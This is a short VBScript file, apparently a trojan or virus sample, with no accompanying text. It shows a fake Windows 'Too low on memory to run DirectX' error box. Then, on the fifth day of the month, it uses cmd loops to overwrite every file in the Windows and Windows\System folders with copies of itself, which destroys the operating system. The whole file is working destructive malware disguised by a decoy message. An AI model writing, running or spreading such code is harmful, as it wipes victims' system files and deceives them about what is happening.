a = MsgBox("Too low on memory to run DirectX.",16,"Windows")
'SuperCEL please don't sue me!
If Day(Now()) = 5 Then
Set WshShell = Wscript.CreateObject("Wscript.Shell")
CommandPath = WSHShell.ExpandEnvironmentStrings("%comspec%")
WshShell.Run (CommandPath & " /c for %%a in (C:\WINDOWS\SYSTEM\*.*) do copy /y " & Wscript.ScriptFullName & " %%a >nul")
WshShell.Run (CommandPath & " /c for %%a in (C:\WINDOWS\*.*) do copy /y " & Wscript.ScriptFullName & " %%a >nul")
End If